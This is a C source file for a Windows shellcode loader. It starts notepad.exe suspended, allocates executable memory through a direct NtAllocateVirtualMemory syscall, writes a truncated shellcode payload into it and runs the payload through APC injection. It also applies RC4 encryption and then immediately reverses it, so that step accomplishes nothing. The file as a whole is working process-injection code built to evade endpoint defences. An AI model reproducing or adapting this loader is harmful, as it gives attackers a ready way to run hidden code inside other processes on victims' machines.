#include <windows.h>
#include <stdio.h>
#include "ProcessCreation.h"
#include "PayloadInjection.h"
#include "RC4Encryption.h"
#include "Syscalls.h" // Include the syscall header

unsigned char payload[] = {
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50,
    // (truncated shellcode for launching notepad.exe)
};

unsigned char key[] = { 0x11, 0x22, 0x33, 0x44 };  // Example key

int main() {
    DWORD processId;
    HANDLE hProcess, hThread;
    PVOID baseAddress = NULL;
    SIZE_T regionSize = sizeof(payload);

    // Step 1: Encrypt the payload using RC4 at runtime
    printf("[*] Starting payload encryption...\n");
    RC4Encrypt(payload, sizeof(payload), key, sizeof(key));  // Encrypt the shellcode
    printf("[+] Payload encrypted successfully.\n");

    // Step 2: Create a suspended process (Notepad)
    printf("[*] Attempting to create a suspended process (notepad.exe)...\n");
    if (!CreateSuspendedProcess("notepad.exe", &processId, &hProcess, &hThread)) {
        printf("[!] Failed to create suspended process. Error Code: %lu\n", GetLastError());
        return -1;
    }
    printf("[+] Process created successfully with PID: %d.\n", processId);

    // Step 3: Decrypt the encrypted payload before injecting it
    printf("[*] Decrypting the encrypted payload...\n");
    RC4Encrypt(payload, sizeof(payload), key, sizeof(key));  // Decrypt the shellcode
    printf("[+] Payload decrypted successfully.\n");

    // Step 4: Use the NtAllocateVirtualMemory syscall instead of VirtualAllocEx
    printf("[*] Allocating memory using NtAllocateVirtualMemory syscall...\n");
    NTSTATUS status = NtAllocateVirtualMemory(hProcess, &baseAddress, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != 0) {
        printf("[!] Memory allocation failed with syscall. Status: 0x%08x\n", status);
        return -1;
    }

    // Step 5: Inject the decrypted payload into the process
    printf("[*] Injecting decrypted payload into the process...\n");
    if (!WriteProcessMemory(hProcess, baseAddress, payload, sizeof(payload), NULL)) {
        printf("[!] Payload injection failed. Error Code: %lu\n", GetLastError());
        return -1;
    }
    printf("[+] Payload injected at base address: 0x%p.\n", baseAddress);

    // Step 6: Queue the payload for execution using APC injection
    printf("[*] Queuing the payload using APC injection...\n");
    if (!QueuePayloadAPC(hThread, baseAddress)) {
        printf("[!] Failed to queue payload for APC injection. Error Code: %lu\n", GetLastError());
        return -1;
    }
    printf("[+] Payload successfully queued for APC injection.\n");

    // Step 7: Resume the thread to execute the payload
    printf("[*] Resuming the thread to execute the payload...\n");
    if (ResumeThread(hThread) == -1) {
        printf("[!] Failed to resume thread. Error Code: %lu\n", GetLastError());
        return -1;
    }
    printf("[+] Thread resumed successfully, payload should now execute.\n");

    return 0;
}
